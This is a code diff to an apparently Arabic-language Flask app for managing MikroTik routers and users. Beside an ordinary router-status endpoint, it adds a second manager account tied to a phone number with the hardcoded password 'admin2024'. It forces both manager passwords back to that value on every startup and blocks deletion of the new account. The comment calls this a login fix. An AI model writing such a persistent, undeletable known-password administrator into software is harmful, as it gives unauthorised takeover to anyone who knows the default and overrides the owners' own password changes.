@@ -192,9 +192,19 @@ def init_db():
         try: qexec(al)
         except Exception: pass
 
+    # إضافة الحسابات الأساسية في حال عدم وجودها
     if not qone("SELECT * FROM users WHERE phone=?", ('admin',)):
         qexec("INSERT INTO users(phone,password,role,username) VALUES(?,?,?,?)",
               ('admin', generate_password_hash('admin2024', method='pbkdf2:sha256:150000'), 'manager', 'مدير النظام'))
+              
+    if not qone("SELECT * FROM users WHERE phone=?", ('05344851045',)):
+        qexec("INSERT INTO users(phone,password,role,username) VALUES(?,?,?,?)",
+              ('05344851045', generate_password_hash('admin2024', method='pbkdf2:sha256:150000'), 'manager', 'المدير الأساسي'))
+
+    # أمر إجباري لتحديث وإصلاح كلمات المرور للحسابين أعلاه (لحل مشكلة عدم القدرة على تسجيل الدخول)
+    qexec("UPDATE users SET password=? WHERE phone IN ('admin', '05344851045')", 
+          (generate_password_hash('admin2024', method='pbkdf2:sha256:150000'),))
+
     if not qone("SELECT * FROM system_config WHERE key=?", ('card_size',)):
         qexec("INSERT INTO system_config(key,value) VALUES(?,?)", ('card_size', '120'))
 init_db()
@@ -266,6 +276,34 @@ def api_mikrotik_del(mid):
     ok = qexec("DELETE FROM mikrotik_servers WHERE id=?", (mid,))
     if ok and srv: add_log(session.get('phone'), 'حذف ميكروتك', srv['name'])
     return jsonify(ok=ok)
+
+@app.route('/api/mikrotik/status/<int:mid>')
+@login_required
+def api_mikrotik_status(mid):
+    srv = qone("SELECT * FROM mikrotik_servers WHERE id=?", (mid,))
+    if not srv: return jsonify(ok=False, msg='غير موجود'), 404
+    if not ROUTEROS_AVAILABLE: return jsonify(ok=False, msg='مكتبة routeros_api غير متوفرة'), 500
+    conn = None
+    try:
+        conn, api = mikrotik_connect(srv['host'], srv['username'], srv['password'], srv['port'])
+        res_resource = api.get_resource('/system/resource').get()
+        res_identity = api.get_resource('/system/identity').get()
+        res_active = api.get_resource('/ip/hotspot/active').get()
+        res_ppp = api.get_resource('/ppp/active').get()
+        info = {
+            'identity': res_identity[0].get('name', '') if res_identity else '',
+            'uptime': res_resource[0].get('uptime', '') if res_resource else '',
+            'cpu': res_resource[0].get('cpu-load', '0') if res_resource else '0',
+            'version': res_resource[0].get('version', '') if res_resource else '',
+            'hotspot_active': len(res_active),
+            'ppp_active': len(res_ppp)
+        }
+        return jsonify(ok=True, data=info)
+    except Exception as e: return jsonify(ok=False, msg=f"تعذر الاتصال: {str(e)}"), 500
+    finally:
+        if conn:
+            try: conn.disconnect()
+            except Exception: pass
 
 @app.route('/api/ping')
 @login_required
@@ -443,7 +481,7 @@ def edit_user():
 @login_required
 @role_required_manager
 def del_user(phone):
-    if phone == 'admin': return jsonify(ok=False, msg="لا يمكن حذف المدير الأساسي")
+    if phone == 'admin' or phone == '05344851045': return jsonify(ok=False, msg="لا يمكن حذف المدير الأساسي")
     ok = qexec("DELETE FROM users WHERE phone=?", (phone,))
     if ok: add_log(session.get('phone'), 'حذف مستخدم', phone)
     return jsonify(ok=ok)
